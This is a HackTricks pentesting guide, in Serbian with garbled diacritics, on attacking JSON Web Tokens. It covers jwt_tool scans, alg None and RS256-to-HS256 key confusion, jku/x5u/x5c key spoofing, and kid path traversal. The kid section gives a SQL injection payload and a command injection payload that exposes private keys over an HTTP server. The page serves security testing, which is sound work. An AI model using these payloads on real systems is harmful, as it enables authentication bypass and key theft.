# JWT Vulnerabilnosti (Json Web Tokens)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

![](<../.gitbook/assets/image (638) (3).png>)

**Savet za bug bounty**: **registrujte se** na **Intigriti**, premium **platformu za bug bounty kreiranu od strane hakera, za hakere**! PridruÅ¾ite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas i poÄnite da zaraÄ‘ujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

**Deo ovog posta se zasniva na sjajnom postu:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Autor odliÄnog alata za pentestiranje JWT-ova** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Brzi uspesi**

Pokrenite [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) sa modom `All Tests!` i saÄekajte zelene linije
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
Ako imate sreÄ‡e, alat Ä‡e pronaÄ‡i neki sluÄaj u kojem web aplikacija nepravilno proverava JWT:

![](<../.gitbook/assets/image (435).png>)

Zatim, moÅ¾ete pretraÅ¾iti zahtev u svom proxy-ju ili izvuÄ‡i koriÅ¡Ä‡eni JWT za taj zahtev koristeÄ‡i jwt\_ alat:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### Menjanje podataka bez modifikacije

MoÅ¾ete jednostavno menjati podatke ostavljajuÄ‡i potpis nepromenjenim i proveriti da li server proverava potpis. PokuÅ¡ajte da promenite svoje korisniÄko ime na "admin", na primer.

#### **Da li se proverava token?**

Da biste proverili da li se potpis JWT-a proverava:

- Poruka o greÅ¡ci ukazuje na trenutnu proveru; osetljivi detalji u opÅ¡irnim greÅ¡kama trebaju biti pregledani.
- Promena na vraÄ‡enoj stranici takoÄ‘e ukazuje na proveru.
- Nema promene ukazuje na nedostatak provere; tada moÅ¾ete eksperimentisati sa izmenom tvrdnji o podacima.

### Poreklo

VaÅ¾no je utvrditi da li je token generisan sa strane servera ili sa strane klijenta pregledom istorije zahteva proksija.

- Tokeni koji su prvi put viÄ‘eni sa strane klijenta ukazuju na to da kljuÄ moÅ¾e biti izloÅ¾en kodu sa strane klijenta, Å¡to zahteva dalje istraÅ¾ivanje.
- Tokeni koji potiÄu sa strane servera ukazuju na siguran proces.

### Trajanje

Proverite da li token traje duÅ¾e od 24 sata... moÅ¾da nikada ne istiÄe. Ako postoji polje "exp", proverite da li server pravilno obraÄ‘uje to polje.

### Brute-force HMAC tajni kljuÄ

[**Pogledajte ovu stranicu.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### Izmena algoritma na None (CVE-2015-9235)

Postavite koriÅ¡Ä‡eni algoritam kao "None" i uklonite deo sa potpisom.

Koristite Burp ekstenziju "JSON Web Token" da biste isprobali ovu ranjivost i promenili razliÄite vrednosti unutar JWT-a (poÅ¡aljite zahtev na Repeater i u kartici "JSON Web Token" moÅ¾ete izmeniti vrednosti tokena. TakoÄ‘e moÅ¾ete odabrati da postavite vrednost polja "Alg" na "None").

### Promena algoritma RS256(asimetriÄni) u HS256(simetriÄni) (CVE-2016-5431/CVE-2016-10555)

Algoritam HS256 koristi tajni kljuÄ za potpisivanje i proveru svake poruke.\
Algoritam RS256 koristi privatni kljuÄ za potpisivanje poruke i javni kljuÄ za autentifikaciju.

Ako promenite algoritam sa RS256 na HS256, kod na serverskoj strani koristi javni kljuÄ kao tajni kljuÄ, a zatim koristi HS256 algoritam za proveru potpisa.

Zatim, koristeÄ‡i javni kljuÄ i menjanje RS256 u HS256, mogli bismo kreirati validan potpis. MoÅ¾ete dobiti sertifikat veb servera izvrÅ¡avanjem ovoga:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### Novi javni kljuÄ unutar zaglavlja

NapadaÄ ugraÄ‘uje novi kljuÄ u zaglavlje tokena, a server koristi ovaj novi kljuÄ za verifikaciju potpisa (CVE-2018-0114).

To se moÅ¾e uraditi pomoÄ‡u "JSON Web Tokens" Burp ekstenzije.\
(PoÅ¡aljite zahtev na Repeater, unutar kartice JSON Web Token odaberite "CVE-2018-0114" i poÅ¡aljite zahtev).

### JWKS prevara

U uputstvima je opisan metod za procenu sigurnosti JWT tokena, posebno onih koji koriste "jku" zaglavlje. Ovaj zaglavlje treba da vodi do JWKS (JSON Web Key Set) fajla koji sadrÅ¾i javni kljuÄ neophodan za verifikaciju tokena.

- **Procena tokena sa "jku" zaglavljem**:
- Proverite URL "jku" zaglavlja kako biste se uverili da vodi do odgovarajuÄ‡eg JWKS fajla.
- Izmenite vrednost "jku" zaglavlja tokena kako biste usmerili ka kontrolisanoj veb usluzi i omoguÄ‡ili posmatranje saobraÄ‡aja.

- **Pratite HTTP interakciju**:
- Posmatranje HTTP zahteva ka odabranom URL-u ukazuje na serverove pokuÅ¡aje da preuzme kljuÄeve sa vaÅ¡eg pruÅ¾enog linka.
- Prilikom koriÅ¡Ä‡enja `jwt_tool` za ovaj proces, vaÅ¾no je aÅ¾urirati `jwtconf.ini` fajl sa vaÅ¡om liÄnom lokacijom JWKS kako biste olakÅ¡ali testiranje.

- **Komanda za `jwt_tool`**:
- IzvrÅ¡ite sledeÄ‡u komandu kako biste simulirali scenario sa `jwt_tool`:
```bash
python3 jwt_tool.py JWT_OVDE -X s
```

### Kid pregled problema

Opcioni zaglavlje poznato kao `kid` se koristi za identifikaciju odreÄ‘enog kljuÄa, Å¡to postaje posebno vaÅ¾no u okruÅ¾enjima gde postoji viÅ¡e kljuÄeva za verifikaciju potpisa tokena. Ovaj claim pomaÅ¾e u odabiru odgovarajuÄ‡eg kljuÄa za verifikaciju potpisa tokena.

#### Otkrivanje kljuÄa putem "kid"

Kada je `kid` claim prisutan u zaglavlju, preporuÄuje se pretraÅ¾ivanje veb direktorijuma za odgovarajuÄ‡i fajl ili njegove varijacije. Na primer, ako je navedeno `"kid":"key/12345"`, treba pretraÅ¾iti fajlove _/key/12345_ i _/key/12345.pem_ u korenu veb servera.

#### Putanja prolaza sa "kid"

`kid` claim takoÄ‘e moÅ¾e biti iskoriÅ¡Ä‡en za navigaciju kroz sistem fajlova, Å¡to potencijalno omoguÄ‡ava izbor proizvoljnog fajla. MoguÄ‡e je testirati konektivnost ili izvrÅ¡iti napade Server-Side Request Forgery (SSRF) izmenom vrednosti `kid` kako bi se ciljali odreÄ‘eni fajlovi ili usluge. Manipulacija JWT-om kako bi se promenila vrednost `kid` zadrÅ¾avajuÄ‡i originalni potpis moÅ¾e se postiÄ‡i koriÅ¡Ä‡enjem `-T` zastavice u jwt_tool, kao Å¡to je prikazano u primeru ispod:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
CiljajuÄ‡i datoteke sa predvidivim sadrÅ¾ajem, moguÄ‡e je falsifikovati validan JWT. Na primer, datoteka `/proc/sys/kernel/randomize_va_space` u Linux sistemima, poznata po vrednosti **2**, moÅ¾e se koristiti u parametru `kid` sa **2** kao simetriÄnom lozinkom za generisanje JWT-a.

#### SQL Injection putem "kid"

Ako se sadrÅ¾aj tvrdnje `kid` koristi za dohvatanje lozinke iz baze podataka, SQL injection moÅ¾e biti olakÅ¡an modifikacijom `kid` payload-a. Primer payload-a koji koristi SQL injection za izmenu procesa potpisivanja JWT-a je:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Ova izmena prisiljava koriÅ¡Ä‡enje poznatog tajnog kljuÄa, `ATTACKER`, za potpisivanje JWT-a.

#### OS Injection putem "kid"

Scenario u kojem parametar `kid` specificira putanju do datoteke koja se koristi u kontekstu izvrÅ¡avanja komande moÅ¾e dovesti do ranjivosti udaljenog izvrÅ¡avanja koda (RCE). Ubacivanjem komandi u parametar `kid`, moguÄ‡e je otkriti privatne kljuÄeve. Primer payload-a za postizanje RCE-a i otkrivanje kljuÄeva je:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u i jku

#### jku

jku oznaÄava **JWK Set URL**.\
Ako token koristi "jku" **Header** tvrdnju, **proverite pruÅ¾eni URL**. Ovo bi trebalo da upuÄ‡uje na URL koji sadrÅ¾i JWKS datoteku koja sadrÅ¾i javni kljuÄ za verifikaciju tokena. Izmenite token da jku vrednost upuÄ‡uje na web servis za koji moÅ¾ete pratiti saobraÄ‡aj.

Prvo morate kreirati novi sertifikat sa novim privatnim i javnim kljuÄevima.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Zatim moÅ¾ete koristiti na primer [**jwt.io**](https://jwt.io) da biste kreirali novi JWT sa **kreiranim javnim i privatnim kljuÄevima i postavili parametar jku na kreirani sertifikat.** Da biste kreirali validan jku sertifikat, moÅ¾ete preuzeti originalni sertifikat i promeniti potrebne parametre.

Parametre "e" i "n" moÅ¾ete dobiti iz javnog sertifikata koristeÄ‡i:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL. URI koji pokazuje na skup X.509 (standard formata sertifikata) javnih sertifikata kodiranih u PEM formatu. Prvi sertifikat u skupu mora biti onaj koji se koristi za potpisivanje ovog JWT-a. Svaki sledeÄ‡i sertifikat potpisuje prethodni, Äime se kompletira lanac sertifikata. X.509 je definisan u RFC 52807. Potrebna je transportna sigurnost za prenos sertifikata.

PokuÅ¡ajte **promeniti ovaj zaglavlje u URL koji je pod vaÅ¡om kontrolom** i proverite da li je primljen bilo kakav zahtev. U tom sluÄaju, **moÅ¾ete manipulisati JWT-om**.

Da biste falsifikovali novi token koristeÄ‡i sertifikat koji je pod vaÅ¡om kontrolom, morate kreirati sertifikat i izvuÄ‡i javni i privatni kljuÄ:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Zatim moÅ¾ete koristiti na primer [**jwt.io**](https://jwt.io) da biste kreirali novi JWT sa **kreiranim javnim i privatnim kljuÄevima i postavili parametar x5u na sertifikat .crt koji je kreiran**.

![](<../.gitbook/assets/image (439).png>)

TakoÄ‘e moÅ¾ete iskoristiti oba ova propusta **za SSRF**.

#### x5c

Ovaj parametar moÅ¾e sadrÅ¾ati **sertifikat u base64 formatu**:

![](<../.gitbook/assets/image (440).png>)

Ako napadaÄ **generiÅ¡e samopotpisani sertifikat** i kreira laÅ¾ni token koristeÄ‡i odgovarajuÄ‡i privatni kljuÄ, zatim zameni vrednost parametra "x5c" sa novo generisanim sertifikatom i izmeni druge parametre, npr. n, e i x5t, tada Ä‡e laÅ¾ni token biti prihvaÄ‡en od strane servera.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### UgraÄ‘eni javni kljuÄ (CVE-2018-0114)

Ako JWT ima ugraÄ‘eni javni kljuÄ kao u sledeÄ‡em scenariju:

![](<../.gitbook/assets/image (438).png>)

KoriÅ¡Ä‡enjem sledeÄ‡eg Node.js skripta moguÄ‡e je generisati javni kljuÄ iz tih podataka:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="â€‹ANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"â€‹;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
MoguÄ‡e je generisati novi privatni/javni kljuÄ, ugraditi novi javni kljuÄ unutar tokena i koristiti ga za generisanje nove potpisa:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
MoÅ¾ete dobiti "n" i "e" koristeÄ‡i ovaj Node.js skript:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
KonaÄno, koristeÄ‡i javni i privatni kljuÄ i nove vrednosti "n" i "e", moÅ¾ete koristiti [jwt.io](https://jwt.io) da biste napravili novi validan JWT sa bilo kojim informacijama.

### JTI (JWT ID)

JTI (JWT ID) tvrdnja pruÅ¾a jedinstveni identifikator za JWT token. MoÅ¾e se koristiti kako bi se spreÄilo ponovno reprodukovanje tokena.\
MeÄ‘utim, zamislite situaciju u kojoj je maksimalna duÅ¾ina ID-a 4 (0001-9999). Zahtevi 0001 i 10001 Ä‡e koristiti isti ID. Dakle, ako backend poveÄ‡ava ID sa svakim zahtevom, moÅ¾ete zloupotrebiti ovo da biste **ponovno reprodukovali zahtev** (potrebno je poslati 10000 zahteva izmeÄ‘u svakog uspeÅ¡nog reprodukovanja).

### JWT registrovane tvrdnje

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Ostali napadi

**Napadi prenoÅ¡enja izmeÄ‘u usluga**

PrimeÄ‡eno je da neke web aplikacije oslanjaju na pouzdanu JWT uslugu za generisanje i upravljanje svojim tokenima. ZabeleÅ¾eni su sluÄajevi gde je token, generisan za jednog klijenta od strane JWT usluge, prihvaÄ‡en od strane drugog klijenta iste JWT usluge. Ako se primeti izdavanje ili obnavljanje JWT putem usluge treÄ‡e strane, treba istraÅ¾iti moguÄ‡nost registracije naloga na drugom klijentu te usluge koristeÄ‡i isto korisniÄko ime/e-poÅ¡tu. Zatim treba pokuÅ¡ati reprodukovati dobijeni token u zahtevu cilju da se vidi da li je prihvaÄ‡en.

- Prihvatanje vaÅ¡eg tokena moÅ¾e ukazivati na kritiÄan problem, Å¡to potencijalno omoguÄ‡ava falsifikovanje naloga bilo kog korisnika. MeÄ‘utim, treba napomenuti da moÅ¾e biti potrebna dozvola za Å¡iri testiranje ako se registrujete na aplikaciju treÄ‡e strane, jer to moÅ¾e uÄ‡i u pravnu sivu zonu.

**Provera isteka tokena**

Istek tokena se proverava pomoÄ‡u tvrdnje "exp" u Payload-u. S obzirom da se JWT Äesto koristi bez informacija o sesiji, potrebno je paÅ¾ljivo rukovanje. U mnogim sluÄajevima, hvatanje i reprodukovanje JWT-a druge korisnike moÅ¾e omoguÄ‡iti impersonaciju tog korisnika. RFC za JWT preporuÄuje smanjenje rizika od reprodukovanja JWT napada koriÅ¡Ä‡enjem tvrdnje "exp" za postavljanje vremena isteka tokena. TakoÄ‘e, implementacija relevantnih provera od strane aplikacije kako bi se osigurala obrada ove vrednosti i odbacivanje isteklih tokena je kljuÄna. Ako token sadrÅ¾i tvrdnju "exp" i vremenska ograniÄenja za testiranje to dozvoljavaju, preporuÄuje se Äuvanje tokena i reprodukovanje nakon Å¡to je isteklo vreme. SadrÅ¾aj tokena, ukljuÄujuÄ‡i parsiranje vremenske oznake i proveru isteka (vremenska oznaka u UTC formatu), moÅ¾e se proÄitati koriÅ¡Ä‡enjem zastavice -R u jwt_tool-u.

- Postoji sigurnosni rizik ako aplikacija i dalje validira token, jer to moÅ¾e implicirati da token nikada ne moÅ¾e isteÄ‡i.


### Alati

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<img src="../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty savet**: **registrujte se** za **Intigriti**, premium **platformu za bug bounty kreiranu od strane hakera, za hakere**! PridruÅ¾ite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas i poÄnite da zaraÄ‘ujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
